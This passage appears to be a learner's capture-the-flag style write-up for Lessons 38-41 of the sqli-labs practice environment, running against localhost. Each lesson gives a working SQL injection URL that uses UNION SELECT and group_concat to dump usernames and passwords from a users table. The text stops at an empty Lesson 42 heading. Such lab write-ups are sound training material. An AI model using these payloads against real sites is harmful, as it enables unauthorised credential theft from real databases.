# Chapter-12

This section will contain write-ups for the ```Stacked Injections``` section of sqli-labs. 

## Lesson 38

This is a rather simple challenge. 

The url for this challenge is as follows -

```
http://localhost/sqlilabs/Less-38/?id=-1' union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

:star2: Yaaaaay! This was the last challenge in the advanced section of ```sqli-labs```. 

## Lesson 39 

A simple challenge. Sql injection can be performed directly without breaking the query. 

The url for the same will look somewhat like this - 

```
http://localhost/sqlilabs/Less-39/?id=-1 union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

## Lesson 40 

A simple blind injection challenge. On breaking the query with a ```'```, the website does not show any error message. Hence, we have to guess and fix the query. 

The url for this challenge is shown below - 

```
http://localhost/sqlilabs/Less-40/?id=-3') union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

## Lesson 41

This is also a blind injection challenge. We might skip the obvious here. 

We can get the data by performing a direct injection without breaking the query. 

The url for the same is shown below - 

```
http://localhost/sqlilabs/Less-41/?id=-3 union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

## Lesson 42
